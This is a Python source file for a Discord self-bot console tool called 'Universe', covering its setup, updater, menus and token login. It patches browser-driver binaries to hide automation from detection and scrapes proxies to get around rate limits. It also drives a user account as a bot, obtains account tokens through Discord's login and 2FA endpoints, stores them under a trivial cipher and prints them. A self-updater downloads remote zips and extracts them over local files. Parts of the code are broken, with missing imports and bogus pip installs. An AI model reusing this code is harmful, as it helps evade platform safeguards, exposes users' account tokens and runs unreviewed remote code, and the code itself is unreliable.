import os
from os import system
from os import get_terminal_size
from distutils.version import LooseVersion
import zipfile
try:
    import pygame
except:
    os.system('pip install pygame')
try:
    import keyboard
except:
    os.system('pip install keyboard')
try:
    import colorama
    from colorama import *
except:
    os.system('pip install colorama')
try:
    import time
    from time import sleep
except:
    os.system('pip install time')
try:
    import pycenter
    from pycenter import center
except:
    os.system('pip install pycenter')
try:
    import getpass
except:
    os.system('pip install getpass')
try:
    import pypresence
    from pypresence import Presence
except:
    os.system('pip install pypresence')
try:
    import multiprocessing
except:
    os.system('pip install multiprocessing')
try:
    import random
except:
    os.system('pip install random')
try:
    import re
    from re import findall
except:
    os.system('pip install re')
try:
    import json
    from json import loads, dumps
except:
    os.system('pip install json')
try:
    import requests
except:
    os.system('pip install requests')
try:
    import threading
    from threading import Thread
except:
    os.system('pip install threading')
try:
    import base64
    from base64 import b16decode, b32decode, b64decode
except:
    os.system('pip install base64')
try:
    import selenium
    from selenium import webdriver
    from selenium.webdriver.chrome.service import Service
    from webdriver_manager.chrome import ChromeDriverManager
except:
    os.system('pip install selenium')
try:
    import PIL
    from PIL import Image
except:
    os.system('pip install PIL')
try:
    import bs4
    from bs4 import BeautifulSoup as bs4
except:
    os.system('pip install bs4')
try:
    import pyperclip
except:
    os.system('pip install pyperclip')
try:
    import pyautogui
except:
    os.system('pip install pyautogui')
try:
    import os.path
except:
    os.system('pip install os.path')
try:
    import sys
    from sys import argv
except:
    os.system('pip install sys')
try:
    import datetime
    from datetime import datetime
    from datetime import date
except:
    os.system('pip install datetime')
try:
    import dhooks
    from dhooks import Webhook
except:
    os.system('pip install dhhoks')
try:
    import io
except:
    os.system('pip install io')
try:
    import urllib
    import urllib.request
    from urllib.request import urlopen
    from urllib.request import urlretrieve
except:
    os.system('pip install urllib')
try:
    import gtts
    from gtts import gTTS
except:
    os.system('pip install gtts')
try:
    import asyncio
except:
    os.system('pip install asyncio')
try:
    import webbrowser
except:
    os.system('pip install webbrowser')
try:
    import functools
except:
    os.system('pip install functools')
try:
    import ctypes
    from ctypes import windll
except:
    os.system('pip install ctypes')
try:
    from urllib import parse, request
    import urllib.parse
except:
    os.system('pip install urllib')
try:
    import string
except:
    os.system('pip install string')
try:
    import aiohttp
except:
    os.system('pip install aiohttp')
try:
    import discord
    from discord.ext import commands
    from discord.utils import get
except:
    os.system('pip install discord')
try:
    import numpy
except:
    os.system('pip install numpy')


class Universe:
    def pass1():
        if Universe.config.data["pass1"] == "true":
            Universe.config.edit('pass1', 'false')
        elif Universe.config.data["pass1"] == "false":
            pass
        else:
            Universe.config.edit('pass1', 'false')
    def pass3():
        if Universe.config.data["pass3"] == "true":
            Universe.config.edit('pass3', 'false')
        elif Universe.config.data["pass3"] == "false":
            pass
        else:
            Universe.config.edit('pass3', 'false')
    def pass2():
        ss = requests.get("https://pastebin.com/raw/VZRf34Gf").text
        ss = json.loads(ss)
        version = ss.get('version')

        codeofverif = "-v2"

        if not version == codeofverif:
            Universe.print.normal(True, 'You are using old Universe.')
            Universe.clear()
            Universe.print.normal(True, 'Updating...')
            getlink = requests.get("https://raw.githubusercontent.com/DaFrenchTokio/Universe/main/api_1").text
            getlink = json.loads(getlink)
            if os.path.basename(sys.argv[0]).endswith("exe"):
                url_file_exe = getlink('url_file_exe')
                date_file_exe = getlink('date_file_exe')
                source = requests.get(url_file_exe)
                with open("Universev2.zip", 'wb') as zipfile:
                    zipfile.write(source.content)
                with ZipFile("Universev2.zip", 'r') as filezip:
                    filezip.extractall()
                os.remove("Universev2.zip")
                cwd = os.getcwd() + '\\Universev2'
                shutil.copytree(cwd, os.getcwd(), dirs_exist_ok=True)
                shutil.rmtree(cwd)
                Universe.print.normal(True, f"Update Finished - Date Of Updated File : {date_file_exe}")
                Universe.pause()
                quit()
            elif os.path.basename(sys.argv[0]).endswith("py"):
                # url
                url_file_py = getlink('url_file_py')
                date_file_py = getlink('date_file_py')
                source = requests.get(url_file_py)
                with open("Universev2.zip", 'wb') as zipfile:
                    zipfile.write(source.content)
                with ZipFile("Universev2.zip", 'r') as filezip:
                    filezip.extractall()
                os.remove("Universev2.zip")
                cwd = os.getcwd() + '\\Universev2'
                shutil.copytree(cwd, os.getcwd(), dirs_exist_ok=True)
                shutil.rmtree(cwd)
                Universe.print.normal(True, f"Update Finished - Date Of Updated File : {date_file_py}")
                Universe.pause()
                quit()
            else:
                Universe.print.error('Py, Exe File not Detected, Make Sure To Not Rename File')
                Universe.print.error('tokon.site.xyz/softwares, Download The New Universe')
                Universe.pause()
                quit()
    def title():
        title = Universe.banner.title
        os.system(f'title {title}')
    def music():
        if Universe.config.data["music"] == "true":
            pygame.mixer.init()
            playlist = list()
            for music in os.listdir('St/e5/playlist'):
                playlist.append(music)
            pygame.mixer.music.load(f'St/e5/playlist/{playlist.pop()}')  # Get the first track from the playlist
            pygame.mixer.music.queue(f'St/e5/playlist/{playlist.pop()}')  # Queue the 2nd song
            pygame.mixer.music.set_endevent(pygame.USEREVENT)  # Setup the end track event
            pygame.mixer.music.set_volume(0.5)
            pygame.mixer.music.play()  # Play the music
            if not pygame.mixer.music.get_busy():
                if len(playlist) > 0:  # If there are more tracks in the queue...
                    pygame.mixer.music.queue(f'St/e5/playlist/{playlist.pop()}')  # Q

    def richpresence():
        try:
            rpc = Presence(949695677695426610, pipe=0)
            rpc.connect()
            rpc.update(state="Discord Menu", details=f"Tool Made In Py", large_image='universe',
                       buttons=[{"label": "Website", "url": f"https://tokon.site.xyz"},
                                {"label": "Discord", "url": f"https://tokon.site.xyz/discord"}])
        except:
            for root, dirs, files in os.walk(os.getenv("APPDATA") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Discord Inc"):
                for name in files:
                    discord_file = os.path.join(root, name)
                    os.startfile(discord_file)
    def remove_error():
        class DevNull:
            def write(self, msg):
                pass

        sys.stderr = DevNull()
    def restart():
        os.system('mode 50,10')
        os.startfile(__file__)
        exit()
    def clear():
        if sys.platform == "linux":
            os.system('clear')
        else:
            os.system('cls')
    def resolution(x, y):
        os.system(f'mode {x},{y}')
    def pause():
        os.system('pause >nul')
    class config:
        datafolder = open(f'St/e2/config.json')
        data = json.load(datafolder)
        datafolder.close()
        def edit(variable, value, data=data):
            ff = open(f'St/e2/config.json', 'w')
            data[variable] = value
            json.dump(data, ff)
            ff.close()

    class driver:
        class Chrome_Installer(object):
            installed = False
            target_version = None
            DL_BASE = "https://chromedriver.storage.googleapis.com/"

            def __init__(self, executable_path=None, target_version=None, *args, **kwargs):
                self.platform = sys.platform
                google_target_ver = 0

                if google_target_ver:
                    self.target_version = google_target_ver

                if target_version:
                    self.target_version = target_version

                if not self.target_version:
                    self.target_version = self.get_release_version_number().version[0]

                self._base = base_ = "chromedriver{}"

                exe_name = self._base
                if self.platform in ("win32",):
                    exe_name = base_.format(".exe")
                if self.platform in ("linux",):
                    self.platform += "64"
                    exe_name = exe_name.format("")
                if self.platform in ("darwin",):
                    self.platform = "mac64"
                    exe_name = exe_name.format("")
                self.executable_path = executable_path or exe_name
                self._exe_name = exe_name

                if not os.path.exists(self.executable_path):
                    self.fetch_chromedriver()
                    if not self.__class__.installed:
                        if self.patch_binary():
                            self.__class__.installed = True

            @staticmethod
            def random_cdc():
                cdc = random.choices('abcdefghijklmnopqrstuvwxyz', k=26)
                cdc[-6:-4] = map(str.upper, cdc[-6:-4])
                cdc[2] = cdc[0]
                cdc[3] = "_"
                return "".join(cdc).encode()

            def patch_binary(self):
                linect = 0
                replacement = self.random_cdc()
                with io.open(self.executable_path, "r+b") as fh:
                    for line in iter(lambda: fh.readline(), b""):
                        if b"cdc_" in line:
                            fh.seek(-len(line), 1)
                            newline = re.sub(b"cdc_.{22}", replacement, line)
                            fh.write(newline)
                            linect += 1
                    return linect

            def get_release_version_number(self):
                path = (
                    "LATEST_RELEASE"
                    if not self.target_version
                    else f"LATEST_RELEASE_{self.target_version}"
                )
                return LooseVersion(urlopen(self.__class__.DL_BASE + path).read().decode())

            def fetch_chromedriver(self):
                base_ = self._base
                zip_name = base_.format(".zip")
                ver = self.get_release_version_number().vstring
                if os.path.exists(self.executable_path):
                    return self.executable_path
                urlretrieve(
                    f"{self.__class__.DL_BASE}{ver}/{base_.format(f'_{self.platform}')}.zip",
                    filename=zip_name,
                )
                with zipfile.ZipFile(zip_name) as zf:
                    zf.extract(self._exe_name)
                os.remove(zip_name)
                if sys.platform != "win32":
                    os.chmod(self._exe_name, 0o755)
                return self._exe_name

        class Edge_Installer(object):
            installed = False
            target_version = None
            DL_BASE = "https://msedgedriver.azureedge.net/"

            def __init__(self, executable_path=None, target_version=None, *args, **kwargs):
                self.platform = sys.platform
                edge_target_ver = 0
                if edge_target_ver:
                    self.target_version = edge_target_ver

                if target_version:
                    self.target_version = target_version

                if not self.target_version:
                    self.target_version = self.get_release_version_number().version[0]

                self._base = base_ = "edgedriver{}"

                exe_name = self._base
                if self.platform in ("win32",):
                    exe_name = base_.format(".exe")
                if self.platform in ("linux",):
                    self.platform += "64"
                    exe_name = exe_name.format("")
                if self.platform in ("darwin",):
                    self.platform = "mac64"
                    exe_name = exe_name.format("")
                self.executable_path = executable_path or exe_name
                self._exe_name = exe_name

                if not os.path.exists(self.executable_path):
                    self.fetch_edgedriver()
                    if not self.__class__.installed:
                        if self.patch_binary():
                            self.__class__.installed = True

            @staticmethod
            def random_cdc():
                cdc = random.choices('abcdefghijklmnopqrstuvwxyz', k=26)
                cdc[-6:-4] = map(str.upper, cdc[-6:-4])
                cdc[2] = cdc[0]
                cdc[3] = "_"
                return "".join(cdc).encode()

            def patch_binary(self):
                linect = 0
                replacement = self.random_cdc()
                with io.open("ms" + self.executable_path, "r+b") as fh:
                    for line in iter(lambda: fh.readline(), b""):
                        if b"cdc_" in line:
                            fh.seek(-len(line), 1)
                            newline = re.sub(b"cdc_.{22}", replacement, line)
                            fh.write(newline)
                            linect += 1
                    return linect

            def get_release_version_number(self):
                path = (
                    "LATEST_STABLE"
                    if not self.target_version
                    else f"LATEST_RELEASE_{str(self.target_version).split('.', 1)[0]}"
                )
                urlretrieve(
                    f"{self.__class__.DL_BASE}{path}",
                    filename=f"{os.getenv('temp')}\\{path}",
                )
                with open(f"{os.getenv('temp')}\\{path}", "r+") as f:
                    _file = f.read().strip("\n")
                    content = ""
                    for char in [x for x in _file]:
                        for num in ("0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "."):
                            if char == num:
                                content += char
                return LooseVersion(content)

            def fetch_edgedriver(self):
                base_ = self._base
                zip_name = base_.format(".zip")
                ver = self.get_release_version_number().vstring
                if os.path.exists(self.executable_path):
                    return self.executable_path
                urlretrieve(
                    f"{self.__class__.DL_BASE}{ver}/{base_.format(f'_{self.platform}')}.zip",
                    filename=zip_name,
                )
                with zipfile.ZipFile(zip_name) as zf:
                    zf.extract("ms" + self._exe_name)
                os.remove(zip_name)
                if sys.platform != "win32":
                    os.chmod(self._exe_name, 0o755)
                return self._exe_name

        class Opera_Installer(object):
            DL_BASE = "https://github.com"

            def __init__(self, *args, **kwargs):
                self.platform = sys.platform
                self.links = ""

                r = requests.get(self.__class__.DL_BASE + "/operasoftware/operachromiumdriver/releases")
                soup = bs4(r.text, 'html.parser')
                for link in soup.find_all('a'):
                    if "operadriver" in link.get('href'):
                        self.links += f"{link.get('href')}\n"

                for i in self.links.split("\n")[:4]:
                    if self.platform in i:
                        self.fetch_edgedriver(i)

            def fetch_edgedriver(self, driver):
                executable = "operadriver.exe"
                driver_name = driver.split("/")[-1]
                cwd = os.getcwd() + os.sep

                urlretrieve(self.__class__.DL_BASE + driver, filename=driver_name)
                with zipfile.ZipFile(driver_name) as zf:
                    zf.extractall()
                shutil.move(cwd + driver_name[:-4] + os.sep + executable, cwd + executable)
                os.remove(driver_name)
                shutil.rmtree(driver_name[:-4])
        def getDriver():
            # supported drivers
            drivers = ["chromedriver.exe", "msedgedriver.exe", "operadriver.exe"]
            print(f"\n{Fore.BLUE}Checking Driver. . .")
            time.sleep(0.5)
            for driver in drivers:
                # Checking if driver already exists
                if os.path.exists(os.getcwd() + os.sep + driver):
                    Universe.print.normal(True, f"{Fore.GREEN}{driver} detected !")
                    time.sleep(0.5)
                    return driver
            else:
                print(f"{Fore.RED}Driver not found! Installing it for you")
                # get installed browsers + install driver + return correct driver
                if os.path.exists(os.getenv('localappdata') + '\\Google'):
                    Universe.driver.Chrome_Installer()
                    Universe.print.normal(True, f"chromedriver.exe Installed!")
                    return "chromedriver.exe"
                elif os.path.exists(os.getenv('appdata') + '\\Opera Software\\Opera Stable'):
                    Universe.driver.Opera_Installer()
                    Universe.print.normal(True, f"operadriver.exe Installed!")
                    return "operadriver.exe"
                elif os.path.exists(os.getenv('localappdata') + '\\Microsoft\\Edge'):
                    Universe.driver.Edge_Installer()
                    Universe.print.normal(True, f"msedgedriver.exe Installed!")
                    return "msedgedriver.exe"
                else:
                    Universe.print.error(f'No compatible driver, Installing ChromeDriver')
                    Universe.driver.Chrome_Installer()
                    Universe.print.normal(True, f"trying with chromedriver.exe")
                    return "chromedriver.exe"

    class crypt:
        def encode(tok, tom):
            encoded = ""
            for char in tok:
                if char == "a":
                    encoded += "#"
                if char == "A":
                    encoded += "~"
                if char == "b":
                    encoded += "*"
                if char == "B":
                    encoded += "^"
                if char == "c":
                    encoded += "&"
                if char == "C":
                    encoded += "é"
                if char == "d":
                    encoded += '"'
                if char == "D":
                    encoded += "'"
                if char == "e":
                    encoded += "{"
                if char == "E":
                    encoded += "("
                if char == "f":
                    encoded += "["
                if char == "F":
                    encoded += "-"
                if char == "g":
                    encoded += "|"
                if char == "G":
                    encoded += "è"
                if char == "h":
                    encoded += "`"
                if char == "H":
                    encoded += "_"
                if char == "i":
                    encoded += "ç"
                if char == "I":
                    encoded += "à"
                if char == "j":
                    encoded += "@"
                if char == "J":
                    encoded += ")"
                if char == "k":
                    encoded += "°"
                if char == "K":
                    encoded += "]"
                if char == "l":
                    encoded += "="
                if char == "L":
                    encoded += "+"
                if char == "m":
                    encoded += "}"
                if char == "M":
                    encoded += "$"
                if char == "n":
                    encoded += "¤"
                if char == "N":
                    encoded += "a"
                if char == "o":
                    encoded += "A"
                if char == "O":
                    encoded += "b"
                if char == "p":
                    encoded += "B"
                if char == "P":
                    encoded += "c"
                if char == "q":
                    encoded += "C"
                if char == "Q":
                    encoded += "d"
                if char == "r":
                    encoded += "D"
                if char == "R":
                    encoded += "e"
                if char == "s":
                    encoded += "E"
                if char == "S":
                    encoded += "f"
                if char == "t":
                    encoded += "F"
                if char == "T":
                    encoded += "g"
                if char == "u":
                    encoded += "G"
                if char == "U":
                    encoded += "h"
                if char == "v":
                    encoded += "H"
                if char == "V":
                    encoded += "i"
                if char == "w":
                    encoded += "I"
                if char == "W":
                    encoded += "j"
                if char == "x":
                    encoded += "J"
                if char == "X":
                    encoded += "k"
                if char == "y":
                    encoded += "K"
                if char == "Y":
                    encoded += "l"
                if char == "z":
                    encoded += "L"
                if char == "Z":
                    encoded += "M"
                if char == " ":
                    encoded += ","
                if char == "1":
                    encoded += "0"
                if char == "2":
                    encoded += "9"
                if char == "3":
                    encoded += "8"
                if char == "4":
                    encoded += "7"
                if char == "5":
                    encoded += "6"
                if char == "6":
                    encoded += "5"
                if char == "7":
                    encoded += "4"
                if char == "8":
                    encoded += "3"
                if char == "9":
                    encoded += "2"
                if char == "0":
                    encoded += "1"
                if char == "&":
                    encoded += "N"
                if char == "é":
                    encoded += "o"
                if char == "-":
                    encoded += "O"
                if char == "è":
                    encoded += "p"
                if char == "_":
                    encoded += "P"
                if char == 'ç':
                    encoded += "Q"
                if char == 'à':
                    encoded += "q"
                if char == ',':
                    encoded += "R"
                if char == '.':
                    encoded += "r"
            if tom == "T":
                with open('St/e8/log.txt', 'w') as ff:
                    ff.write(encoded)
                    ff.close()
            elif tom == "I":
                with open('St/e8/log2.txt', 'w') as ff:
                    ff.write(encoded)
                    ff.close()
            else:
                tok = encoded
                return tok

        def decode(_encode):
            if _encode == "T":
                arg = open(f'St/e8/log.txt')
                argument = arg.read()
            elif _encode == "I":
                arg = open(f'St/e8/log2.txt')
                argument = arg.read()
            else:
                argument = _encode
            argum = ""
            for char in argument:
                if char == "#":
                    argum += "a"
                if char == "~":
                    argum += "A"
                if char == "*":
                    argum += "b"
                if char == "^":
                    argum += "B"
                if char == "&":
                    argum += "c"
                if char == "é":
                    argum += "C"
                if char == '"':
                    argum += "d"
                if char == "'":
                    argum += "D"
                if char == "{":
                    argum += "e"
                if char == "(":
                    argum += "E"
                if char == "[":
                    argum += "f"
                if char == "-":
                    argum += "F"
                if char == "|":
                    argum += "g"
                if char == "è":
                    argum += "G"
                if char == "`":
                    argum += "h"
                if char == "_":
                    argum += "H"
                if char == "ç":
                    argum += "i"
                if char == "à":
                    argum += "I"
                if char == "@":
                    argum += "j"
                if char == ")":
                    argum += "J"
                if char == "°":
                    argum += "k"
                if char == "]":
                    argum += "K"
                if char == "=":
                    argum += "l"
                if char == "+":
                    argum += "L"
                if char == "}":
                    argum += "m"
                if char == "$":
                    argum += "M"
                if char == "¤":
                    argum += "n"
                if char == "a":
                    argum += "N"
                if char == "A":
                    argum += "o"
                if char == "b":
                    argum += "O"
                if char == "B":
                    argum += "p"
                if char == "c":
                    argum += "P"
                if char == "C":
                    argum += "q"
                if char == "d":
                    argum += "Q"
                if char == "D":
                    argum += "r"
                if char == "e":
                    argum += "R"
                if char == "E":
                    argum += "s"
                if char == "f":
                    argum += "S"
                if char == "F":
                    argum += "t"
                if char == "g":
                    argum += "T"
                if char == "G":
                    argum += "u"
                if char == "h":
                    argum += "U"
                if char == "H":
                    argum += "v"
                if char == "i":
                    argum += "V"
                if char == "I":
                    argum += "w"
                if char == "j":
                    argum += "W"
                if char == "J":
                    argum += "x"
                if char == "k":
                    argum += "X"
                if char == "K":
                    argum += "y"
                if char == "l":
                    argum += "Y"
                if char == "L":
                    argum += "z"
                if char == "M":
                    argum += "Z"
                if char == ",":
                    argum += " "
                if char == "0":
                    argum += "1"
                if char == "9":
                    argum += "2"
                if char == "8":
                    argum += "3"
                if char == "7":
                    argum += "4"
                if char == "6":
                    argum += "5"
                if char == "5":
                    argum += "6"
                if char == "4":
                    argum += "7"
                if char == "3":
                    argum += "8"
                if char == "2":
                    argum += "9"
                if char == "1":
                    argum += "0"
                if char == "N":
                    argum += "&"
                if char == "o":
                    argum += "é"
                if char == "O":
                    argum += "-"
                if char == "p":
                    argum += "è"
                if char == "P":
                    argum += "_"
                if char == "Q":
                    argum += 'ç'
                if char == "q":
                    argum += 'à'
                if char == "R":
                    argum += ','
                if char == "r":
                    argum += '.'
            if not argument == _encode:
                arg.close()
            _encode = argum
            return _encode
    class proxy:
        def proxy_scrape():
            proxieslog = []
            startTim = time.time()
            temp = os.getenv("temp") + "\\proxiesuniverse"
            def fetchProxies(url, custom_regex):
                global proxylist
                try:
                    proxylist = requests.get(url, timeout=5).text
                except Exception:
                    pass
                finally:
                    proxylist = proxylist.replace('null', '')
                # get the proxies from all the sites with the custom regex
                custom_regex = custom_regex.replace('%ip%', '([0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3})')
                custom_regex = custom_regex.replace('%port%', '([0-9]{1,5})')
                for proxy in re.findall(re.compile(custom_regex), proxylist):
                    proxieslog.append(f"{proxy[0]}:{proxy[1]}")

            # all urls
            proxysources = [
                ["http://spys.me/proxy.txt", "%ip%:%port% "],
                ["http://www.httptunnel.ge/ProxyListForFree.aspx", " target=\"_new\">%ip%:%port%</a>"],
                ["https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.json",
                 "\"ip\":\"%ip%\",\"port\":\"%port%\","],
                ["https://raw.githubusercontent.com/fate0/proxylist/master/proxy.list",
                 '"host": "%ip%".*?"country": "(.*?){2}",.*?"port": %port%'],
                ["https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list.txt",
                 '%ip%:%port% (.*?){2}-.-S \\+'],
                ["https://raw.githubusercontent.com/opsxcq/proxy-list/master/list.txt",
                 '%ip%", "type": "http", "port": %port%'],
                ["https://www.us-proxy.org/",
                 "<tr><td>%ip%<\\/td><td>%port%<\\/td><td>(.*?){2}<\\/td><td class='hm'>.*?<\\/td><td>.*?<\\/td><td class='hm'>.*?<\\/td><td class='hx'>(.*?)<\\/td><td class='hm'>.*?<\\/td><\\/tr>"],
                ["https://free-proxy-list.net/",
                 "<tr><td>%ip%<\\/td><td>%port%<\\/td><td>(.*?){2}<\\/td><td class='hm'>.*?<\\/td><td>.*?<\\/td><td class='hm'>.*?<\\/td><td class='hx'>(.*?)<\\/td><td class='hm'>.*?<\\/td><\\/tr>"],
                ["https://www.sslproxies.org/",
                 "<tr><td>%ip%<\\/td><td>%port%<\\/td><td>(.*?){2}<\\/td><td class='hm'>.*?<\\/td><td>.*?<\\/td><td class='hm'>.*?<\\/td><td class='hx'>(.*?)<\\/td><td class='hm'>.*?<\\/td><\\/tr>"],
                [
                    "https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=6000&country=all&ssl=yes&anonymity=all",
                    "%ip%:%port%"],
                ["https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt", "%ip%:%port%"],
                ["https://raw.githubusercontent.com/shiftytr/proxy-list/master/proxy.txt", "%ip%:%port%"],
                ["https://proxylist.icu/proxy/", "<td>%ip%:%port%</td><td>http<"],
                ["https://proxylist.icu/proxy/1", "<td>%ip%:%port%</td><td>http<"],
                ["https://proxylist.icu/proxy/2", "<td>%ip%:%port%</td><td>http<"],
                ["https://proxylist.icu/proxy/3", "<td>%ip%:%port%</td><td>http<"],
                ["https://proxylist.icu/proxy/4", "<td>%ip%:%port%</td><td>http<"],
                ["https://proxylist.icu/proxy/5", "<td>%ip%:%port%</td><td>http<"],
                ["https://www.hide-my-ip.com/proxylist.shtml", '"i":"%ip%","p":"%port%",'],
                ["https://raw.githubusercontent.com/scidam/proxy-list/master/proxy.json",
                 '"ip": "%ip%",\n.*?"port": "%port%",']
            ]
            threads = []
            for url in proxysources:
                # send them out in threads
                t = threading.Thread(target=fetchProxies, args=(url[0], url[1]))
                threads.append(t)
                t.start()
            for t in threads:
                t.join()

            proxies = list(set(proxieslog))
            with open(temp, "w") as f:
                for proxy in proxies:
                    # create the same proxy 7-10 times to avoid ratelimit when using other options
                    for i in range(random.randint(7, 10)):
                        f.write(f"{proxy}\n")

        def proxy():
            temp = os.getenv("temp") + "\\proxiesuniverse"
            # if the file size is empty
            if os.stat(temp).st_size == 0:
                Universe.proxy.proxy_scrape()
            proxies = open(temp).read().split('\n')
            proxy = proxies[0]

            with open(temp, 'r+') as fp:
                # read all lines
                lines = fp.readlines()
                # get the first line
                fp.seek(0)
                # remove the proxy
                fp.truncate()
                fp.writelines(lines[1:])
            return proxy
    class print:
        t = time.localtime()
        current_time = time.strftime("%H:%M:%S", t)
        def menu(list):
            count = 0
            spaces = ""
            for _ in list:
                count += 1
            Universe.print.center(Universe.banner.horizontal_bar * 10)
            Universe.print.center('Commands')
            Universe.print.center(Universe.banner.horizontal_bar * 10)
            print()
            for cmd in list:
                time.sleep(0.25)
                Universe.print.center(cmd)

        def center(text):
            print(Universe.print.main_center.Center(text))
        def normal(icon, text):
            t = time.localtime()
            current_time = time.strftime("%H:%M:%S", t)
            if icon == False:
                print(text)
            if icon == True:
                print(f'{current_time} {Fore.RESET}| {Fore.BLUE}[{Fore.RESET}¤{Fore.LIGHTBLUE_EX}] {Fore.RESET}{text}')
        def error(text):
            t = time.localtime()
            current_time = time.strftime("%H:%M:%S", t)
            print(f'{current_time} {Fore.RESET}| {Fore.RED}[{Fore.RESET}¤{Fore.RED}] {Fore.RESET}{text}')

        def event(text):
            t = time.localtime()
            current_time = time.strftime("%H:%M:%S", t)
            print(f'{current_time} {Fore.RESET}| {Fore.YELLOW}[{Fore.RESET}¤{Fore.YELLOW}] {Fore.RESET}{text}')

        input = f"{current_time} {Fore.RESET}| {Fore.BLUE}[{Fore.RESET}¤{Fore.LIGHTBLUE_EX}] {Fore.RESET}"
        class main_center:
            def Center(var: str, spaces: int = None, icon: str = " ", middle: bool = False):
                if spaces is None:
                    def _xspaces(var: str):
                        try:
                            col = get_terminal_size().columns
                        except OSError:
                            return 0
                        varl = var.splitlines()
                        nvarl = max(len(v) for v in varl if v.strip())
                        return int((col - nvarl) / 2)
                    spaces = _xspaces(var=var)

                if not middle:
                    return "\n".join((icon * spaces) + var for var in var.splitlines())
                else:
                    return "\n".join((icon * spaces) + var + (icon * int(spaces)) for var in var.splitlines())

    class banner:
        generalurl = "https://pastebin.com/raw/"
        # Bar
        horizontal_bar = requests.get(f'{generalurl}wwAG8eDG').text
        vertical_bar = requests.get(f'{generalurl}pMNbzJm4').text
        # Vanity
        vanitymethod = requests.get(f'https://raw.githubusercontent.com/DaFrenchTokio/Universe/main/vanity').text
        # Title
        title = requests.get(f'{generalurl}KaP2BndL').text
        # lenny
        lenny = requests.get(f'{generalurl}S6D4u1SY').text
        # special
        doublearrow = requests.get(f'{generalurl}1sQagDKB').text
        # Invisible character
        invisiblechar = requests.get(f'{generalurl}jRuXFZtg').text
        # Logo
        g = f"\033[38;2;1;1;255m"
        gg = f"\033[38;2;1;1;220m"
        g_3 = f"\033[38;2;1;1;200m"
        g_4 = f"\033[38;2;1;1;180m"
        g_5 = f"\033[38;2;1;1;140m"
        g_6 = f"\033[38;2;1;1;125m"
        g_7 = f"\033[38;2;1;1;100m"
        r = f"{Fore.RESET}"
        logo = requests.get(f"{generalurl}KeG4wExH").text
        logo = logo.replace('{g}', f'{g}').replace('{gg}', f'{gg}').replace('{g_3}', f'{g_3}').replace('{g_4}', f'{g_4}').replace('{g_5}', f'{g_5}').replace('{g_6}', f'{g_6}').replace('{g_7}', f'{g_7}').replace('{r}', f'{r}')

Universe.clear()
Universe.pass1()
Universe.pass2()
Universe.pass3()
Universe.richpresence()
Universe.title()
Universe.music()

idlog = Universe.crypt.decode('I')
token = Universe.crypt.decode('T')

Tokon = discord.Client()
Tokon = commands.Bot(description='Tokon', command_prefix=';', self_bot=True)

premium_link = requests.get("https://pastebin.com/raw/xB93nUKA").text
premium_keys = json.loads(premium_link)
premium_status = premium_keys.get(f'status_{idlog}')
premium_saveid = premium_keys.get(f'id_{idlog}')

def logoprincipal():
    Universe.clear()
    l = f"""
                                                                                        
                                                                             
{Universe.banner.logo}      
                                                                         
{Universe.banner.horizontal_bar * 150}
                                                                         
                                                                         
    """
    print(l)

def method():
    Universe.clear()
    logoprincipal()
    g = f"\033[38;2;1;1;255m"
    r = f"{Fore.RESET}"
    if Universe.config.data["saved"] == "true":
        print(center('[1] Stay With Same Token, [2] Change Token'))
        changer = input(f'{Universe.print.input}Choice : ')
        if changer == "1":
            Universe.clear()
            logoprincipal()
        if changer == "2":
            Universe.config.edit('saved', 'false')
            Universe.config.edit('injected', 'false')
            method()
        if not changer == "2" and not changer == "1":
            logoprincipal()
            method()
    if not Universe.config.data["saved"] == "true":
        if not Universe.config.data["injected"] == "true":
            injection = input(f'{Universe.print.input}Enter Your Token For Inject: ')
            client = discord.Client()
            @client.event
            async def on_connect():
                Universe.crypt.encode(str(client.user.id), 'I')
                Universe.config.edit('injected', 'true')
                Universe.print.normal(True, 'Token Injected !')
                time.sleep(1.5)
                Universe.restart()
            def Init():
                try:
                    client.run(injection, bot=False)
                except discord.errors.LoginFailure:
                    while True:
                        email = str(input(f"{Universe.print.input}E-mail: "))
                        password = str(input(f"{Universe.print.input}Password: "))

                        payload = {
                            "email": email,
                            "password": password
                        }

                        r = requests.post('https://discord.com/api/v9/auth/login', json=payload).json()
                        if "captcha_key" in r:
                            Universe.print.error("A captcha is requested, the email entered is invalid or has been attempted too many times on connection. Rewrite your information.")
                            time.sleep(1)
                        elif "errors" in r:
                            Universe.print.error("An error has occurred. Rewrite your information.")
                        elif r["token"] == None:
                            break
                        else:
                            Universe.print.normal(True, "Token: " + r["token"])
                            Universe.pause()
                            exit()
                    while True:
                        if r["token"] == None:
                            print("-----------2FA Authentication-----------")
                            code = input(Fore.RED + "Enter the 2FA authentication code: ")
                            mfa_payload = {
                                "code": code,
                                "ticket": r["ticket"]
                            }
                            r2 = requests.post('https://discord.com/api/v9/auth/mfa/totp', json=mfa_payload).json()
                            if "message" in r2:
                                Universe.print.error("The 2FA authentication code is incorrect. Rewrite the code.")
                                Universe.pause()
                            else:
                                Universe.print.normal(True, "Token: " + r2["token"])
                                Universe.pause()
                                sys.exit()
            Init()
            
        else:
            injection = input(f'{Universe.print.input}Enter Your Token : ')
            Universe.crypt.encode(injection, 'T')
            Universe.print.normal(True, 'Token Encoded + Saved')
            Universe.config.edit('saved', 'true')
            time.sleep(2)
            logoprincipal()
def launch():
    if Universe.config.data["pass1"] == "false":
        Universe.config.edit('pass1', 'true')
        logoprincipal()
        method()
    logoprincipal()
    if Universe.config.data["pass3"] == "false":
        cmd = "menu"
        Universe.config.edit('pass3', 'true')
    else:
        cmd = input(f"{Universe.print.input}Enter The Command ~> ")
    if cmd == "menu":
        menulist = ["menu", "discord", "music", "premium", "settings", "restart", "exit"]
        Universe.print.menu(menulist)
        Universe.pause()
        launch()
    if cmd == "settings":
        logoprincipal()
        token = Universe.crypt.decode("T")
        id = Universe.crypt.decode("I")
        Universe.print.center(f'Saved Token : {token}')
        Universe.print.center(f'Saved ID : {id}')
        print()
        l = f"""
[1] Change Token           {Universe.banner.vertical_bar} [3] Turn Off Music {Universe.banner.vertical_bar} [5] Exit
[2] Change Music Playlist  {Universe.banner.vertical_bar} [4] Turn On Music  {Universe.banner.vertical_bar}
"""
        print(Universe.banner.horizontal_bar * 150)
        Universe.print.center(l)
        def choice():
            choice = input(f'{Universe.print.input}Enter Choice : ')
